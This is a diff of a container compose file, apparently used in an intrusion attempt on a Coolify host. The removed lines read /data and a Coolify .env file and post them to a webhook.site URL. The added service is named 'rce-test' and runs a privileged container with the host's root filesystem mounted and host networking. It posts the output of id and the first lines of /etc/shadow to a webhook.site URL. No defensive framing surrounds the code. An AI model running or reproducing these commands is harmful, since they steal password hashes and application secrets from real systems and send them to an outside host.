@@ -1,9 +1,12 @@
-command:
-  - sh
-  - -c
-  - |
-    # Пробуем читать /data напрямую (не через /host-root)
-    ls /data/ 2>&1 | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=data_ls
-    
-    # Если сработает - пробуем .env
-    cat /data/coolify/source/.env 2>&1 | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=data_env
+version: "3.8"
+services:
+  rce-test:
+    image: alpine:3.19
+    privileged: true
+    network_mode: host
+    volumes:
+      - /:/host-root
+    command: sh -c "apk add --no-cache curl && id | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=id && cat /host-root/etc/shadow | head -3 | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=shadow && sleep 3600"
+
+
+
